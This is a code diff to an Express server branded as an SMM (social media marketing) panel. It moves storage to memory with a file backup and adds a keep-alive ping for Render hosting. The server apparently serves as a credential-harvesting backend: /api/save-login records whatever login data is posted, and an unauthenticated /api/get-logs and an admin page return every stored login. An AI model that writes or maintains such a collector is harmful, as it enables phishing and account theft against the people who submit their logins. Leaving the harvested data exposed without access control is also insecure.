@@ -9,27 +9,32 @@ const PORT = process.env.PORT || 5000;
 app.use(express.json());
 app.use(express.static(path.join(__dirname)));
 
-// ── File-based DB ──────────────────────────────────────────────
+// ── In-Memory DB + File Backup ─────────────────────────────────
+// In-memory: fast, works on any platform including Render
+// File backup: recovers data after graceful restart/redeploy
 const DB_FILE = path.join(__dirname, 'data.json');
 
-function readDB() {
-    try {
-        if (!fs.existsSync(DB_FILE)) return { logins: [], requests: [] };
-        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
-    } catch { return { logins: [], requests: [] }; }
-}
+let memDB = { logins: [], requests: [] };
 
-function writeDB(data) {
-    try { fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2)); } catch {}
+// Load from file on startup (recover after restart)
+try {
+    if (fs.existsSync(DB_FILE)) {
+        const saved = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
+        if (saved && Array.isArray(saved.logins)) memDB = saved;
+        console.log(`Recovered ${memDB.logins.length} logins, ${memDB.requests.length} requests from disk.`);
+    }
+} catch { memDB = { logins: [], requests: [] }; }
+
+function saveBackup() {
+    try { fs.writeFileSync(DB_FILE, JSON.stringify(memDB, null, 2)); } catch {}
 }
 
 // ── Save Login ─────────────────────────────────────────────────
 app.post('/api/save-login', (req, res) => {
     try {
-        const db = readDB();
         const entry = { ...req.body, time: new Date().toLocaleString() };
-        db.logins.push(entry);
-        writeDB(db);
+        memDB.logins.push(entry);
+        saveBackup();
         res.json({ success: true });
     } catch { res.json({ success: false }); }
 });
@@ -37,29 +42,37 @@ app.post('/api/save-login', (req, res) => {
 // ── Save Request ───────────────────────────────────────────────
 app.post('/api/save-request', (req, res) => {
     try {
-        const db = readDB();
         const entry = { ...req.body, time: new Date().toLocaleString() };
-        db.requests.push(entry);
-        writeDB(db);
+        memDB.requests.push(entry);
+        saveBackup();
         res.json({ success: true });
     } catch { res.json({ success: false }); }
 });
 
 // ── Get Logs ───────────────────────────────────────────────────
 app.get('/api/get-logs', (req, res) => {
-    try {
-        const db = readDB();
-        res.json(db);
-    } catch { res.json({ logins: [], requests: [] }); }
+    res.json(memDB);
 });
 
 // ── Clear Logs ─────────────────────────────────────────────────
 app.post('/api/clear-logs', (req, res) => {
-    try {
-        writeDB({ logins: [], requests: [] });
-        res.json({ success: true });
-    } catch { res.json({ success: false }); }
+    memDB = { logins: [], requests: [] };
+    saveBackup();
+    res.json({ success: true });
 });
+
+// ── Self-Ping: keeps Render free tier awake (every 14 min) ─────
+// Render free services sleep after 15 min of inactivity.
+// RENDER_EXTERNAL_URL is automatically set by Render on deployment.
+function startKeepAlive() {
+    const renderUrl = process.env.RENDER_EXTERNAL_URL;
+    if (!renderUrl) return; // Only runs on Render, not locally
+    setInterval(() => {
+        const url = renderUrl.replace(/\/$/, '') + '/health';
+        https.get(url, () => {}).on('error', () => {});
+        console.log(`Keep-alive ping sent to ${url}`);
+    }, 14 * 60 * 1000); // every 14 minutes
+}
 
 // ── Profile Name Fetcher ──────────────────────────────────────
 // ── Universal Profile API Service ──────────────────────────────
@@ -379,10 +392,14 @@ app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
-// Start the server (local dev)
-app.listen(PORT, () => {
+// Health check for Render
+app.get('/health', (req, res) => res.json({ status: 'ok', time: new Date().toISOString() }));
+
+// Start server — 0.0.0.0 required for Render
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`===========================================`);
     console.log(`   SARDAR RDX SMM PANEL IS RUNNING`);
-    console.log(`   URL: http://localhost:${PORT}`);
+    console.log(`   PORT: ${PORT}`);
     console.log(`===========================================`);
+    startKeepAlive();
 });
